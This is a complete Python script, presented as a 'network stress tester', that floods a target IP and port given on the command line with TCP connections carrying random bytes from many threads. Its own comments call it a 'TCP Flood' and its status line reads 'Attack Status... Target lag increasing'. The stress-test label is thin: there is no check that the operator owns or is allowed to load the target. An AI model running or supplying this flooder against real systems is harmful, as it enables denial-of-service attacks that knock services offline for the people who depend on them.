
import socket
import threading
import time
import sys
import random

class NetworkStressTester:
    def __init__(self, target_ip, target_port=80, num_threads=50):
        self.target_ip = target_ip
        self.target_port = int(target_port)
        self.num_threads = int(num_threads)
        self.running = False
        self.packets_sent = 0

    def stress_worker(self):
        """
        Connects to the target and sends data to simulate high load/traffic.
        This is a 'TCP Flood' style simulation.
        """
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((self.target_ip, self.target_port))
                # Send some random bytes to simulate traffic
                payload = random._urandom(1024)
                s.send(payload)
                self.packets_sent += 1
                s.close()
            except Exception as e:
                # Connection failed/refused (expected if server is overloaded or port closed)
                if self.packets_sent == 0:
                    print(f"DEBUG: Connection failed: {e}")
                pass
            
            # Tiny sleep to prevent total self-DoS
            time.sleep(0.01)

    def start(self):
        print(f"🚀 Starting Network Stress Test on {self.target_ip}:{self.target_port}")
        print(f"🔥 Launching {self.num_threads} threads...")
        print("⚠️  Press Ctrl+C to Stop")
        
        self.running = True
        threads = []
        
        for _ in range(self.num_threads):
            t = threading.Thread(target=self.stress_worker)
            t.daemon = True
            t.start()
            threads.append(t)

        start_time = time.time()
        
        try:
            while True:
                time.sleep(1)
                duration = time.time() - start_time
                rps = self.packets_sent / duration
                print(f"⚡ Attack Status: {self.packets_sent} requests sent ({rps:.1f} req/s) - Target lag increasing...")
        except KeyboardInterrupt:
            print("\n🛑 Stopping Stress Test...")
            self.running = False
            for t in threads:
                t.join(timeout=1.0)
            print("✅ Test Stopped.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python network_stress_test.py <Target_IP> [Port] [Threads]")
        print("Example: python network_stress_test.py 192.168.1.50 80")
        sys.exit(1)
    
    target = sys.argv[1]
    port = sys.argv[2] if len(sys.argv) > 2 else 80
    threads = sys.argv[3] if len(sys.argv) > 3 else 100
    
    attacker = NetworkStressTester(target, port, threads)
    attacker.start()
